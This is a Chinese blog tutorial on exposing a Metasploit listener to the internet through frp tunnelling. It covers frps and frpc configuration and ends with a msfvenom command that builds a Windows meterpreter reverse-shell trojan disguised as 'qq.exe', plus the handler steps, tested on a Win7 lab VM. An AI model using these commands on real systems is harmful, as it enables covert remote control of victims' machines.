---
title: frp 搭建公网 Metasploit
date: 2022-4-18 20:18:36
tags: [Trojan horse,Linux,Kali,Metasploit,frp]
categories: 
 - [CyberSecurity,木马]
cover: https://res.cloudinary.com/sycamore/image/upload/v1682442126/Typera/2023/04/87d91c5d20cc130aa72fe99c74a9e8c2.png
---

## 准备
- **frps** 部署机。
	- 要求：拥有 **公网IP** （例如 **VPS**、云服务器等等）
	- 本文选用 **Ubuntu 18.04.6** 云服务器
- **frpc** 客户机。
	- 要求：能访问互联网
	- 本文选用 **Kali Linux 2022** 虚拟机
- **frp** 的 **Github** 项目地址：[fatedier/frp](https://github.com/fatedier/frp)
## frps（云服务器）
### 下载安装
[**Github** 项目](https://github.com/fatedier/frp) 上找到最新的 [releases](https://github.com/fatedier/frp/releases) ：
![image-20230426011312770](https://res.cloudinary.com/sycamore/image/upload/v1682442796/Typera/2023/04/65c0edabf7c4cf7b431c9f10ff94bc05.png)

1. 在 **云服务器** 终端上下载：`wget https://github.com/fatedier/frp/releases/download/v0.41.0/frp_0.41.0_linux_amd64.tar.gz`
![image-20230426011322302](https://res.cloudinary.com/sycamore/image/upload/v1682442806/Typera/2023/04/d8b546285137f60d42fef4a27a06d821.png)
2. **解压缩** 下载的文件：`tar -zxvf frp_0.41.0_linux_amd64.tar.gz`
![image-20230426011327257](https://res.cloudinary.com/sycamore/image/upload/v1682442811/Typera/2023/04/4063a698f14734b0fb54a92974122ba5.png)
3. **进入** 解压缩的文件夹：`cd frp_0.41.0_linux_amd64/`
4. 因为配置的是 **frps** ，可以 **删除** 文件夹内的 **frpc** 相关文件，防止后续修改出错：**`rm -rf frpc*`**
![image-20230426011332064](https://res.cloudinary.com/sycamore/image/upload/v1682442816/Typera/2023/04/f776553aeca109b5eef6a7e0d3d6bacd.png)
### 编写 frps 配置文件
`vim frps.ini`
内容如下：
（不想要**监控页面**的话，删除对应配置所在 **行** 即可）
```
[common]
bind_port = 7777          # frps和frpc的通讯端口
dashboard_port = 9999     # web监控页面的端口
dashboard_user = Sycamore # 登录监控页面的用户名
dashboard_pwd = 123456    # 登录监控页面的密码
```
如图所示：
![image-20230426011338410](https://res.cloudinary.com/sycamore/image/upload/v1682442822/Typera/2023/04/02f8cca9459920e2f031c95fec4c172e.png)
（需要 **云服务器** 打开 **对应端口**：7777、9999)

### 运行
相关命令 **基本上** 应当在 **frp_0.41.0_linux_amd64 文件夹** 下执行 ~
- 命令行输入：`./frps -c frps.ini`
	- **[注意]**：关闭命令行窗口，或是停止执行该命令，就会 **退出**
- 后台运行：`nohup ./frps -c frps.ini >/dev/null 2>&1 &`
	- 因为通常不会 **关闭云服务器**，所以 **后台运行** 就足够了；
	- 当然也可以 **开启自启动**，详情见 **frpc** 的内容，对应命令改个符号就行 ~

## frpc（Kali 虚拟机）
![image-20230426011342973](https://res.cloudinary.com/sycamore/image/upload/v1682442827/Typera/2023/04/692976286e5ddec8cd744326a1c3a54d.png)
### 下载安装
[**Github** 项目](https://github.com/fatedier/frp) 上找到最新的 [releases](https://github.com/fatedier/frp/releases) 

步骤与 **frps** 的几乎**相同**，**区别** 是：
- 对象变成了 **Kali 虚拟机**，而不是 云服务器
- 以及最后一步 **删除的是 frps**：
	4. 因为配置的是 **frpc** ，可以 **删除** 文件夹内的 **frps** 相关文件，防止后续修改出错：**`rm -rf frps*`**

### 编写 frpc 配置文件
作为一款 **内网穿透** 工具，**frp** 穿透了内网之后，还需要使用 **其他手段**（**ssh**）
和外网建立交互，所以 **配置文件** 中会存在 **[ssh]** 配置。

`vim frpc.ini`
内容如下：
```
[common]
server_addr = 106.15.52.194
server_port = 7777

[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 6666
use_compression = true
```
相关 **解释** 如图：
![image-20230426011350366](https://res.cloudinary.com/sycamore/image/upload/v1682442834/Typera/2023/04/2144e375ff1aca162bb41868d050259f.png)

### 运行
相关命令 **基本上** 应当在 **frp_0.41.0_linux_amd64 文件夹** 下执行 ~
- 命令行输入：`./frpc -c frpc.ini`
	- **[注意]**：关闭命令行窗口，或是停止执行该命令，就会 **退出**
- 开机自启动：
	- 服务目录 **新建并编辑** 文件：`vim /lib/systemd/system/frp.service`
	- 填入以下内容：
		```
		[Unit]
		Description=Frp Client Service
		After=network.target remote-fs.target nss-lookup.target
		Wants=network.target
		
		[Service]
		Type=simple
		ExecStart=/root/frp/frpc -c /root/frp/frpc.ini
		Restart=always
		RestartSec=20s
		
		[Install]
		WantedBy=multi-user.target
		```
	- 启动 **frpc** 服务：`systemctl start frp`
	（最后的 `frp` 名称取决于上一步新建的文件名 `frp.service`）
	- 打开 **frpc** 服务自启动 `systemctl enable frp`
		**[注意]：**
		- 如果要重启应用：`systemctl restart frp`
		- 如果要停止应用：`systemctl stop frp`
		- 如果要查看 **frpc** 的日志：`systemctl status frp`
		- 权限不够，记得加 `sudo`

**服务文件** 重要内容注释 如下图：
![image-20230426011356634](https://res.cloudinary.com/sycamore/image/upload/v1682442841/Typera/2023/04/6e79855b87a38703bd5b740419dc6e65.png)

## SSH 连接测试
- 命令行 `ssh root@x.x.x.x -p 6666`
（**root** 用户登录到 **云服务器x.x.x.x** 的 **6666** 端口）
![](https://res.cloudinary.com/sycamore/image/upload/v1682442846/Typera/2023/04/52501488b9125c9518e2190783a8fcf4.png)
- Xshell 创建新会话，具体内容如下：
![image-20230426011410382](https://res.cloudinary.com/sycamore/image/upload/v1682442854/Typera/2023/04/891e33c279efacbf48adee134034f971.png)![image-20230426011417120](https://res.cloudinary.com/sycamore/image/upload/v1682442861/Typera/2023/04/fe85e7d6d6e0e5955c77ff87a4ea5abe.png)
<br>
**Xshell  连接成功**：
![image-20230426011424294](https://res.cloudinary.com/sycamore/image/upload/v1682442869/Typera/2023/04/7eed7e40069de144ddcfb74725077325.png)
## msf 渗透攻击测试
双击打开 刚刚建立的 **Xshell 新会话**（ frp ）.
### frpc 添加新配置
输入命令：`vim frpc.ini`，编辑 **frpc** 配制文件，
在文件末尾 **添加**：
```
[msf]
type = tcp
local_ip = 127.0.0.1
local_port = 4444
remote_port = 2333 
```
配置内容的 **含义** 与 **[ssh]** 类似，解释如图：
![image-20230426011431000](https://res.cloudinary.com/sycamore/image/upload/v1682442874/Typera/2023/04/75402a4aa7e5b6970ffb51313c0a847f.png)

### msf 生成木马
与连接 **本地的 shell** 生成木马不同，
因为我们要使用 **frp 穿透内网** 连接的 shell ，去 **监听木马反弹**的 shell，
所以我们 **生成木马** 时，设置的 LHOST、LPORT 应当是 **云服务器** 的对应数据。
（直接用内网测试的时候，LHOST、LPORT 填的是 **本地虚拟机** 的相关数据）

用 **msf** 生成 **windows** 系统的 **反向shell** 木马：
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=2333 -f exe > qq.exe`
![image-20230426011437323](https://res.cloudinary.com/sycamore/image/upload/v1682442881/Typera/2023/04/f72e4363a982738b25b5976722ab8948.png)
成功生成木马文件：**qq.exe**

### msf 监听反弹的 shell
> （确定 frps 、frpc 服务均已在后台运行）
> （事先上传 qq.exe 到测试的靶机，本文用 	Win7_x64 虚拟机替代）

> 关于**上传**：Kali 虚拟机 开启 **Apache2** 服务，Win7_x64 虚拟机 内网访问下载：
> ![](https://res.cloudinary.com/sycamore/image/upload/v1682442886/Typera/2023/04/79c8bcdd330dc38041cee9fa333d9bb8.png)

1. `msfconsole`
	- 打开 **msf**
2. `use exploit/multi/handler`
	- 选择使用的 exploit
3. `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
	- 设置 PAYLOAD （生成木马时使用的）
4. `set LHOST 127.0.0.1`
	- 设置 LHOST 为本地 IP
5. `set LPORT 4444`
	- 设置 LPORT 为转发的本地端口 4444
6. run
	- 开始监听

> （先让 **msf** 开始监听，再双击运行上传的木马文件）

演示如图所示：
- 双击 **运行木马**：
![image-20230426011447735](https://res.cloudinary.com/sycamore/image/upload/v1682442892/Typera/2023/04/553d087d53826c0f6f0bc2edf848b2b0.png)
<br>
- msf **开始监听** & 成功获得 meterpreter **shell**：
![image-20230426011457351](https://res.cloudinary.com/sycamore/image/upload/v1682442902/Typera/2023/04/204ea56873200eb9b2507252955adb2a.png)
